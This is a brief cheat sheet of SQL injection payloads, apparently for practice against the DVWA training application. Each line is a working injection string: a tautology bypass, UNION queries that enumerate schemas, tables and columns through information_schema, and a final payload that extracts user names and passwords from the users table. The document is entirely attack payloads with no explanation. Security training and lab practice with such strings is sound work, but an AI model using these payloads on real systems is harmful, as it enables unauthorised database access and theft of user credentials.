SQLi Command Examples

```
%' or 0=0 #
%' or 0=0 union SELECT table_name,2 FROM information_schema.tables #
' UNION select distinct(table_schema),null FROM information_schema.tables -- #
' UNION select table_schema,table_name FROM information_Schema.tables where table_schema = "dvwa" -- #
' UNION select COLUMN_NAME,DATA_TYPE FROM information_schema.columns where TABLE_SCHEMA = "dvwa" and TABLE_NAME = "users" -- #
' union select null, concat(first_name,0x3a,last_name,0x3a,user,0x3a,password) from users -- #
```